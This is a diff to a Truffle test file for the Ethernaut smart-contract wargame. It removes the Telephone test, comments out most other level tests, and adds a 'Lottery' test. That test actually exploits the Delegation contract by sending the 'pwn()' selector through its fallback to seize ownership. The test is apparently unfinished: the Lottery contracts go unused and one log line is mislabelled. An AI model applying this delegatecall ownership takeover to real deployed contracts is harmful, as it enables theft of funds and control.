@@ -1,10 +1,6 @@
 /*eslint no-undef: "off"*/
 const Ethernaut = artifacts.require('./Ethernaut.sol')
 
-const Telephone = artifacts.require('./levels/Telephone.sol')
-const TelephoneFactory = artifacts.require('./levels/TelephoneFactory.sol')
-const TelephoneAttack = artifacts.require('./attacks/TelephoneAttack.sol')
-
 const DelegationFactory = artifacts.require('./levels/DelegationFactory.sol')
 const Delegation = artifacts.require('./levels/Delegation.sol')
 
@@ -22,6 +18,10 @@ const Force = artifacts.require('./levels/Force.sol')
 const ElevatorFactory = artifacts.require('./levels/ElevatorFactory.sol')
 const ElevatorAttack = artifacts.require('./attacks/ElevatorAttack.sol')
 const Elevator = artifacts.require('./levels/Elevator.sol')
+
+const LotteryFactory = artifacts.require('./levels/LotteryFactory.sol')
+const LotteryAttack = artifacts.require('./attacks/LotteryAttack.sol')
+const Lottery = artifacts.require('./levels/Lottery.sol')
 
 const InstanceFactory = artifacts.require('./levels/InstanceFactory.sol')
 const Instance = artifacts.require('./attacks/Instance.sol')
@@ -49,7 +49,7 @@ contract('Ethernaut', function(accounts) {
   before(async function() {
     ethernaut = await Ethernaut.new();
   });
-
+  /*
   // ----------------------------------
   // Token
   // ----------------------------------
@@ -145,7 +145,56 @@ contract('Ethernaut', function(accounts) {
     });
   });
   });
+  */
+  // ----------------------------------
+  // Lottery
+  // ----------------------------------
 
+  describe('Lottery', function() {
+
+    let level
+
+    before(async function() {
+      level = await DelegationFactory.new()
+      await ethernaut.registerLevel(level.address)
+
+    })
+
+    it('should allow the player to solve the level', async function() {
+
+      // Get instance, which should be owned by the level
+      const instance = await utils.createLevelInstance(ethernaut, level.address, player, Delegation);
+      console.log(`player:`, player)
+      console.log(`factory:`, level.address)
+      let owner = await instance.owner.call()
+      console.log(`instance owner:`, level.address)
+      assert.equal(owner, level.address)
+
+      // Use the fallback method to call the delegate's pwn()
+      const pwner = web3.sha3("pwn()").substring(0, 10)
+      await web3.eth.sendTransaction({
+        from: player,
+        to: instance.address,
+        data: pwner
+      }, (err, res) => {})
+
+      // Player should own the instance now
+      owner = await instance.owner.call()
+      console.log(`new instance owner:`, owner)
+      assert.equal(owner, player)
+
+      // Factory check
+      const ethCompleted = await utils.submitLevelInstance(
+        ethernaut,
+        level.address,
+        instance.address,
+        player
+      )
+      assert.equal(ethCompleted, true)
+    });
+  });
+
+  /*
   // ----------------------------------
   // Force
   // ----------------------------------
@@ -518,51 +567,5 @@ contract('Ethernaut', function(accounts) {
     });
 
   });
-
-  // ----------------------------------
-  // Telephone
-  // ----------------------------------
-
-  describe('Telephone', function() {
-
-    let level
-
-    before(async function() {
-      level = await TelephoneFactory.new()
-      await ethernaut.registerLevel(level.address)
-    })
-
-
-    it('should fail if the player did not solve the level', async function() {
-      const instance = await utils.createLevelInstance(ethernaut, level.address, player, Telephone)
-
-      const completed = await utils.submitLevelInstance(
-        ethernaut,
-        level.address,
-        instance.address,
-        player
-      )
-
-      assert.isFalse(completed)
-    });
-
-
-    it('should allow the player to solve the level', async function() {
-      const instance = await utils.createLevelInstance(ethernaut, level.address, player, Telephone)
-
-      const attacker = await TelephoneAttack.new()
-      await attacker.attack(instance.address, player)
-
-      const completed = await utils.submitLevelInstance(
-        ethernaut,
-        level.address,
-        instance.address,
-        player
-      )
-      
-      assert.isTrue(completed)
-    });
-
-  });
-
+*/
 });
